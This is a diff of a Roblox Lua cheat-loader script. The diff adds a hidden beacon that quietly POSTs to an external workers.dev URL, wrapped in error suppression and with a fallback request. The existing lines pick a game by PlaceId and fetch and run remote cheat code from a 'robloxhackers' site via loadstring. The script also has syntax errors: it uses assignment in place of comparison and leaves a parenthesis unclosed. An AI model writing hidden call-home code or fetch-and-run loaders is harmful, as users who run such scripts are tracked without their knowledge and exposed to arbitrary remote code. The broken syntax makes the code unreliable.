@@ -1,3 +1,19 @@
+local url = "https://idk.02fifths-millet.workers.dev/"
+
+local success, result = pcall(function()
+    return http and http.request and http.request({
+        Url = url,
+        Method = "POST",
+        Body = ""
+    })
+end)
+
+if not success or not result then
+    pcall(function()
+        game:HttpGet(url)
+    end)
+end
+
 if game.PlaceId = 286090429 then
   loadstring(game:HttpGet("https://robloxhackers.pages.dev/ArsenalOpenSource")
 elseif game.PlaceId = 4924922222 then
